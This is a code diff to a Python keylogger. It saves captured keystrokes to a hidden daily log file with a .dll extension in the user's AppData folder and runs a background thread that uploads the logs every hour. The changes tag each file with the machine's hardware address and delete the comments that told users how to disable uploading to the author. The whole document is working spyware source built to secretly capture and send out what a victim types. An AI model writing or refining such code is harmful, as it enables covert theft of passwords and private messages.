@@ -4,14 +4,13 @@ from datetime import datetime
 import threading
 import time
 import requests
+import uuid
 #new file  with unique name is created every day
 todays_date = datetime.now().strftime('%Y-%b-%d')
 #you can change directory to any where you like,just keep in mind that there might be admin privilages required for creating a log file
-file_name = 'C:\\Users\\'+getpass.getuser()+'\\AppData\\Local\\' + todays_date + '.dll'
+file_name = 'C:\\Users\\'+getpass.getuser()+'\\AppData\\Local\\' + str(uuid.getnode()) +'-'+ todays_date + '.dll'
 #file_name =  todays_date + '.dll'
 #function to upload logs file every hour,change '%H' to '%M' to upload logs every minute
-
-#comment out this function if you don't want to send logs to me
 def upload():
     lastHour = -1 #ensure first file is always uploaded
     while True:
@@ -24,12 +23,10 @@ def upload():
                 except Exception:
                     continue
                 break
-        time.sleep(5)   #timer in seconds to wait before checking for next hour,used to ensure every hour a log is received
+        time.sleep(10)   #timer in seconds to wait before checking for next hour,used to ensure every hour a log is received
 
 up = threading.Thread(target=upload) # creating a thread so that keylogger works separate from uploading process
 up.start();     #starting thread
-
-#comment out till here
 
 line_buffer = "" #current typed line before return character
 window_name = "" #current window
